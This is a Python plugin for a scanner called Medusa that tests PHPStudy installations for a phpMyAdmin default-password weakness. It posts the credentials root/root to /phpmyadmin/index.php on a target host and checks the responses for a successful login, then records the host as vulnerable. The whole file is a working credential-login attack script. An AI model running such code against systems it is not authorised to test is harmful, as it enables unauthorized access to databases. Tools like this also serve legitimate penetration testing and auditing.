#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['disclosure'] = '2019-10-13'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "PHPStudyPhpmyadminDefaultpwd"  # 插件名称
        self.info['name'] ='PHPStudyphpmyadmin默认密码漏洞' #漏洞名称
        self.info['affects'] = "PHPStudy"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload="/phpmyadmin/index.php"
post_data = {
    "pma_username": "root",
    "pma_password": "root",
    "server": "1",
    "target": "index.php"
}
def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload_url = scheme+"://"+url+ ':' + str(port)+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            "Content-Type": "application/x-www-form-urlencoded",
            'User-Agent': RandomAgent,
        }
        s = requests.session()
        resp = s.post(payload_url, data=post_data,headers=headers,proxies=proxies, timeout=5, verify=False)
        resp2 = s.get(payload_url, headers=headers, timeout=5, proxies=proxies,verify=False)
        con = resp.text
        con2 = resp2.text
        if con2.lower().find('navigation.php')!=-1 and con.lower().find('frame_navigation')!=-1:
            Medusa = "{}存在phpstudy_phpmyadmin默认密码漏洞 \r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            _t = VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类